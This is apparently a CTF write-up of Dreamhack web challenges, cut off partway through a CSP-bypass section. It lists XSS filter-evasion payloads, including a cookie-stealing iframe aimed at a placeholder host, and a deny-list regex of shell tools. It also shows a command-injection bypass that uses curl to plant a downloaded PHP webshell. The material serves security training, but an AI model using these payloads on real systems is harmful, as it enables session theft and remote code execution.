<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;script&quot;</span>, <span class="string">&quot;on&quot;</span>, <span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#&quot;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-----See how to bypass restrictions</span><br><span class="line">&lt;!<span class="string">&#x27;/*&quot;/*/&#x27;</span>/*/<span class="string">&quot;/*--&gt;&lt;/Script&gt;&lt;Image SrcSet=K */; OnError=cOnfirm`1` //&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt;&lt;img src=x onerror=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">alert`<span class="number">1</span>`</span><br><span class="line">al\u0065rt(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&gt;alert`1`&lt;/scr\0ipt&gt;&lt;scr\0ipt/1=&#x27;</span> </span><br><span class="line">&lt;scr\0ipt&gt;alert`<span class="number">1</span>`// </span><br><span class="line">&lt;handler <span class="built_in">id</span>=<span class="string">&quot;y&quot;</span>&gt;alert`<span class="number">127</span>`&lt;/handler&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;</span>&gt;X&lt;/a&gt;</span><br><span class="line">&lt;iFrAMe/src \/\/onload = prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVg &lt;/onlOad =<span class="string">&quot;1&gt; `_=prompt,_`1`` &quot;</span><span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;</span>data:text/html,%3C%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3E%<span class="number">61</span>%6C%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">28</span>%<span class="number">31</span>%<span class="number">29</span>%3C%2F%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3E<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iFrAMeSRC=&quot;</span>jAvAsCrIpT:alert`<span class="number">1</span>`;<span class="string">&quot;&gt;&lt;/iFrAMe&gt;</span></span><br><span class="line"><span class="string">&lt;--`&lt;iMG/srC=` onerror=confirm``&gt; --!&gt;</span></span><br><span class="line"><span class="string">&lt;!&#x27;/*&quot;</span>/*/<span class="string">&#x27;/*/&quot;/*--&gt;&lt;/scr\0ipt&gt;&lt;Image SrcSet=K */; OnError=confirm`1` //&gt;</span></span><br><span class="line"><span class="string">&lt;SVg &lt;/onlOad =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;IMG SRC=&quot;jav	ascript:alert`1`;&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div id=&quot;133&quot;&gt;&lt;!-- `&lt;img/src=xx:xx onerror=alert(133)//--!&gt;//[&quot;&#x27;</span>`--&gt;]]&gt;]&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">----success</span><br><span class="line">&lt;&lt;scr\0ipt/src=http://xss.com/xss.js&gt;&lt;/scr\0ipt</span><br><span class="line"><span class="string">&#x27;&gt;alert`1`&lt;/scr\0ipt&gt;&lt;scr\0ipt/1=&#x27;</span> </span><br><span class="line">&lt;scr\0ipt&gt;alert`<span class="number">1</span>`// </span><br><span class="line">&lt;handler <span class="built_in">id</span>=<span class="string">&quot;y&quot;</span>&gt;alert`<span class="number">127</span>`&lt;/handler&gt;</span><br><span class="line"><span class="string">&quot;&gt;&lt;iframesrc=&quot;</span>http://google.com<span class="string">&quot;%3E</span></span><br><span class="line"><span class="string">&lt;iframe/src\/\/onlOad=prompt`1`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**&lt;iframe src=&quot;</span>data:text/html;test.com;www.youtube.com/XLYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<span class="string">&quot;&gt;&lt;/iframe&gt;**</span></span><br></pre></td></tr></table></figure>

<p>Finally, <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> is encoded through <code>iframe</code> and <code>base64</code>, and the payload that can <code>alert</code> successfully is detected.</p>
<p><img src="/img/Dreamhack1_23.png" alt="Untitled"></p>
<p>when u go to &#x2F;flag page then input that payload</p>
<p><img src="/img/Dreamhack1_24.png" alt="Untitled"></p>
<p>but our target is &#x2F;memo page</p>
<p>so change the payload like this</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">For Example : &lt;iframe src=<span class="string">&quot;jAvAsCrIpT:location.href=&#x27;http://XXXX.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">Payload : &lt;iframe src=<span class="string">&quot;javascri	pt:locati\u006Fn.href=&#x27;/memo?memo=&#x27;</span></span><br><span class="line"><span class="string">+d\u006Fcument.cookie&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>can refer to this <a target="_blank" rel="noopener" href="https://juejin.cn/s/iframexsscheatsheet">https://juejin.cn/s/iframe xss cheat sheet</a></p>
<p><img src="/img/Dreamhack1_25.png" alt="Untitled"></p>
<p>In some cases, to avoid exposing JavaScript code directly, it can be converted to a <code>Unicode</code> string to increase the security of the code. This technique is often used to encrypt, obfuscate, or hide JavaScript code.</p>
<p>The conversion process is simple, that is, converting each character in the JavaScript code to its corresponding Unicode character encoding. For example, the Unicode encoding for character ‘A’ is U+0041, the Unicode encoding for character ‘B’ is U+0042, and so on.</p>
<p>If you have a JavaScript string “ABCD”, the process of converting it to a Unicode string is to convert each character to its Unicode encoding and concatenate them. Therefore, the string might be converted to something like “\u0041\u0042\u0043\u0044”.</p>
<hr>
<h3 id="Switching-Command"><a href="#Switching-Command" class="headerlink" title="Switching Command"></a><strong>Switching Command</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Not Friendly service… Can you switching the command?</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  22351&#x2F;tcp → 8001&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 22351</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:22351/">http://host3.dreamhack.games:22351/</a></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./config/db_config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>]==<span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Failed to parse JSON data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> )&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$username</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="variable">$user</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">            <span class="variable">$password</span> = <span class="string">&quot;***REDACTED***&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">get_result</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> -&gt; num_rows == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: test.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$message</span> = <span class="string">&quot;Something wrong...&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: test.php&quot;</span>);</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Enter Username&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            background-color: <span class="comment">#f4f4f4;</span></span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .container &#123;</span><br><span class="line">            background-color: <span class="comment">#ffffff;</span></span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">            margin: <span class="number">0</span> auto;</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        h2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            margin-bottom: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=<span class="string">&quot;text&quot;</span>] &#123;</span><br><span class="line">            width: <span class="number">90</span>%;</span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            margin-bottom: <span class="number">15</span>px;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">            border-radius: <span class="number">3</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">            background-color: <span class="comment">#007bff;</span></span><br><span class="line">            color: <span class="comment">#fff;</span></span><br><span class="line">            border: none;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            border-radius: <span class="number">3</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=<span class="string">&quot;submit&quot;</span>]:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#0056b3;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .message &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: red;</span><br><span class="line">            margin-top: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;<span class="title">Enter</span> <span class="title">Username</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Submit</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">message</span>; ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>() </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>] : <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$sanitized_command</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$command</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$sanitized_command</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;No hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$resulttt</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$sanitized_command</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>]=== <span class="string">&quot;guest&quot;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;echo hi guest&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;Authentication first&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Command Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Command Test&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$result</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;db&quot;</span>, <span class="string">&quot;dreamhack&quot;</span>, <span class="string">&quot;dreamhack&quot;</span>, <span class="string">&quot;dreamhack&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> name=<span class="string">&quot;&lt;?php echo basename(<span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;TEXT&quot;</span> name=<span class="string">&quot;cmd&quot;</span> autofocus id=<span class="string">&quot;cmd&quot;</span> size=<span class="string">&quot;80&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;SUBMIT&quot;</span> value=<span class="string">&quot;Execute&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//host3.dreamhack.games:22351/test.php?cmd=curl%22https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%22-ohello.php</span></span><br><span class="line"></span><br><span class="line">root@MSI:~<span class="comment"># python3 -m http.server</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (http:<span class="comment">//0.0.0.0:8000/) ...</span></span><br></pre></td></tr></table></figure>

<p>Go to the beginning screen</p>
<p><img src="/img/Dreamhack1_26.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_27.png" alt="Untitled"></p>
<p>username&#x3D;{“username”: “admin”}</p>
<p>But if input ⇒ {“username”:true} </p>
<p><img src="/img/Dreamhack1_28.png" alt="Untitled"></p>
<p>被限制的字元</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>When entering restricted content,</p>
<p><img src="/img/Dreamhack1_29.png" alt="Untitled"></p>
<p>Let’s take a closer look at this part of the code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>] : <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$sanitized_command</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$command</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$sanitized_command</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;No hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$resulttt</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$sanitized_command</span>));</span><br></pre></td></tr></table></figure>

<p>Notice the <code>escapeshellcmd</code> at the bottom</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://wikidocs.net/208715">https://wikidocs.net/208715</a></li>
<li>Any character in an escape string that can be used to trick a shell command into executing arbitrary instructions.</li>
<li>A backslash () is inserted before the following characters: &amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \x0A and \xFF. ‘ and “ are escaped only when unmatched. On Windows platforms, all these characters, as well as the % and ! characters, are replaced by spaces.</li>
<li>Spaces are not escaped</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Replace single <span class="title function_ invoke__">quotes</span> (<span class="string">&#x27;) in the command string with a backslash and single quote combination (\&#x27;).</span></span><br><span class="line"><span class="string">Replaces double quotes (&quot;) in the command string with a backslash and double quote combination (\&quot;).</span></span><br><span class="line"><span class="string">Remove newline characters (\n) from the command string.</span></span><br><span class="line"><span class="string">Remove carriage return characters (\r) from command strings.</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//host3.dreamhack.games:22351/test.php?cmd=curl%22https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%22-ohello.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_30.png" alt="Untitled"></p>
<p>cd..%26%26cd..%26%26ls</p>
<p><img src="/img/Dreamhack1_31.png" alt="Untitled"></p>
<p>Find the directory of flag, you can find that it has execution permission, just execute it directly &#x2F;flag</p>
<p><img src="/img/Dreamhack1_32.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_33.png" alt="Untitled"></p>
<hr>
<h3 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a><strong>CSP Bypass</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: CSP Bypass에서 실습하는 문제입니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.08.07 Dockerfile 제공</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  20531&#x2F;tcp → 8000&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 20531</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:20531/">http://host3.dreamhack.games:20531/</a></strong></p>
<p>let’s see <a target="_blank" rel="noopener" href="http://app.pt/">app.p</a>y </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line">nonce = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_url</span>(<span class="params">url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    cookie.update(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        service = Service(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.add_argument(_)</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.set_page_load_timeout(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        driver.add_cookie(cookie)</span><br><span class="line">        driver.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># return str(e)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_xss</span>(<span class="params">param, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://127.0.0.1:8000/vuln?param=<span class="subst">&#123;urllib.parse.quote(param)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> read_url(url, cookie)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">global</span> nonce</span><br><span class="line">    response.headers[</span><br><span class="line">        <span class="string">&quot;Content-Security-Policy&quot;</span></span><br><span class="line">    ] = <span class="string">f&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-<span class="subst">&#123;nonce&#125;</span>&#x27;&quot;</span></span><br><span class="line">    nonce = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span 